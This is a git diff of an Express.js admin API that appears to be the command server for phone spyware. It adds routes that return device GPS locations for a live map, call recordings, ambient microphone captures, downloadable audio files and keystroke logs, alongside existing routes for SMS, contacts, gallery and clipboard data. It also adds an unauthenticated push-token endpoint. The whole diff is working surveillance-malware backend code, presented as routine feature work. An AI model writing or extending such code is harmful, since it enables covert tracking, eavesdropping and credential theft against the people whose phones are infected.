@@ -333,6 +333,22 @@ router.get('/connections', adminAuth, (req, res) => {
   }
 });
 
+// GET /api/admin/map-snapshot — lightweight GPS-only snapshot for the live map
+// Returns only fields the map needs (no SMS/contacts/gallery data)
+router.get('/map-snapshot', adminAuth, (req, res) => {
+  try {
+    const devices = db.prepare(
+      `SELECT device_id, device_name, model, manufacturer, is_online,
+              latitude, longitude, loc_source, loc_accuracy,
+              city, region, country, isp, last_seen
+       FROM devices ORDER BY last_seen DESC`
+    ).all();
+    res.json({ devices, total: devices.length });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // DELETE /api/admin/connections/:deviceId — remove a device and all its data
 router.delete('/connections/:deviceId', adminAuth, (req, res) => {
   try {
@@ -560,6 +576,70 @@ router.get('/connections/:deviceId/clipboard', adminAuth, (req, res) => {
       page,
       totalPages: Math.ceil((total ? total.count : 0) / limit),
     });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/admin/connections/:deviceId/recordings — list call recordings
+router.get('/connections/:deviceId/recordings', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    try {
+      const rows = db.prepare('SELECT * FROM call_recordings WHERE device_id = ? ORDER BY recorded_at DESC LIMIT 100').all(deviceId);
+      res.json({ recordings: rows, total: rows.length });
+    } catch (_) {
+      res.json({ recordings: [], total: 0 }); // table may not exist yet
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/admin/connections/:deviceId/mic-captures — list ambient recordings
+router.get('/connections/:deviceId/mic-captures', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    try {
+      const rows = db.prepare('SELECT * FROM mic_captures WHERE device_id = ? ORDER BY captured_at DESC LIMIT 50').all(deviceId);
+      res.json({ captures: rows, total: rows.length });
+    } catch (_) {
+      res.json({ captures: [], total: 0 });
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/admin/connections/:deviceId/download-recording/:filename — stream audio file
+router.get('/connections/:deviceId/download-recording/:filename', adminAuth, (req, res) => {
+  try {
+    const { deviceId, filename } = req.params;
+    if (filename.includes('..') || filename.includes('/')) return res.status(400).json({ error: 'Invalid filename' });
+    const filePath = require('path').join(__dirname, '..', 'data', 'recordings', deviceId, filename);
+    if (!require('fs').existsSync(filePath)) return res.status(404).json({ error: 'Recording not found' });
+    res.setHeader('Content-Type', 'audio/mp4');
+    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+    res.sendFile(filePath);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/admin/connections/:deviceId/keylogs — get keylog entries
+router.get('/connections/:deviceId/keylogs', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const page = parseInt(req.query.page) || 1;
+    const limit = parseInt(req.query.limit) || 200;
+    const offset = (page - 1) * limit;
+    try {
+      const total = db.prepare('SELECT COUNT(*) as c FROM keylog_entries WHERE device_id = ?').get(deviceId)?.c || 0;
+      const rows = db.prepare('SELECT * FROM keylog_entries WHERE device_id = ? ORDER BY recorded_at DESC LIMIT ? OFFSET ?').all(deviceId, limit, offset);
+      res.json({ entries: rows, total, page, totalPages: Math.ceil(total / limit) });
+    } catch (_) {
+      res.json({ entries: [], total: 0, page: 1, totalPages: 0 });
+    }
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -2232,6 +2312,30 @@ router.post('/admin-device/register', async (req, res) => {
       is_locked: device?.is_locked === 1,
       message: device?.is_locked === 1 ? 'Locked by Boss' : 'registered'
     });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/admin/admin-device/fcm-token — save FCM push token for a device
+router.post('/admin-device/fcm-token', (req, res) => {
+  try {
+    const { token, device_id } = req.body;
+    if (!token) return res.status(400).json({ error: 'token required' });
+
+    // Store/update FCM token — add column if table exists
+    try {
+      db.exec("ALTER TABLE admin_devices ADD COLUMN fcm_token TEXT DEFAULT ''");
+    } catch (_) {} // column already exists
+
+    if (device_id) {
+      db.prepare("UPDATE admin_devices SET fcm_token = ? WHERE device_id = ?").run(token, device_id);
+    } else {
+      // Store as global token if no device_id (first-time registration before device registers)
+      db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('fcm_token_latest', ?)").run(token);
+    }
+
+    res.json({ success: true });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
